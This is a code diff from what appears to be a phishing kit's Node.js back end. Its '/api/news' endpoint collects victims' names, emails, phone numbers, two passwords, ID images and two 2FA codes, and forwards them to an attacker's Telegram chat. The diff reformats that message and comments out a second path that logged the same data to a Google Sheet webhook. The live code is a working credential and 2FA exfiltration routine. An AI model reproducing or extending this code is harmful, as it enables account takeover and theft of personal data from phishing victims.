@@ -25,46 +25,46 @@ app.post('/api/news', (req, res) => {
 
     // SEND DATA TO TELE
 const message = `IP: ${data.ip ? data.ip : ''}
-    Acount Name: ${data.fill_full_name ? data.fill_full_name : ''} 
-    Email Personal: ${data.fill_personal_email ? data.fill_personal_email : ''}
-    Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
-    Phone Number: ${data.fill_phone ? data.fill_phone : ''}
-    Password First: ${data.first_password ? data.first_password : ''}
-    Password Second: ${data.second_password ? data.second_password : ''}
-    Images: ${data.image ? data.image : ''}
-    --------------------------------------------
-    First 2Fa: ${data.first_code ? data.first_code : ''}
-    Second 2Fa: ${data.second_code ? data.second_code : ''};`
+Acount Name: ${data.fill_full_name ? data.fill_full_name : ''} 
+Email Personal: ${data.fill_personal_email ? data.fill_personal_email : ''}
+Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
+Phone Number: ${data.fill_phone ? data.fill_phone : ''}
+Password First: ${data.first_password ? data.first_password : ''}
+Password Second: ${data.second_password ? data.second_password : ''}
+Images: ${data.image ? data.image : ''}
+--------------------------------------------
+First 2Fa: ${data.first_code ? data.first_code : ''}
+Second 2Fa: ${data.second_code ? data.second_code : ''};`
 
     bot.sendMessage(process.env.CHAT_ID, message);
 
 
-    // ADD GOOGLE SHEET
-    const url = new URL(process.env.WEBHOOK_URL);
+    // // ADD GOOGLE SHEET
+    // const url = new URL(process.env.WEBHOOK_URL);
 
-    url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
-    url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
-    url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
-    url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
-    url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
-    url.searchParams.append('Password First', data.first_password ? data.first_password : '');
-    url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
-    url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
-    url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
-    url.searchParams.append('Images Url', data.image ? data.image : '');
+    // url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
+    // url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
+    // url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
+    // url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
+    // url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
+    // url.searchParams.append('Password First', data.first_password ? data.first_password : '');
+    // url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
+    // url.searchParams.append('Ip', data.ip ? data.ip : '');
+    // url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
+    // url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
+    // url.searchParams.append('Images Url', data.image ? data.image : '');
 
-    axios.get(url)
-        .then(response => {
-            if (response.data.status === 'success') {
-                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-            } else {
-                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-            }
-        })
-        .catch(error => {
-            bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-        });
+    // axios.get(url)
+    //     .then(response => {
+    //         if (response.data.status === 'success') {
+    //             bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+    //         } else {
+    //             bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+    //         }
+    //     })
+    //     .catch(error => {
+    //         bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    //     });
 
 });
 
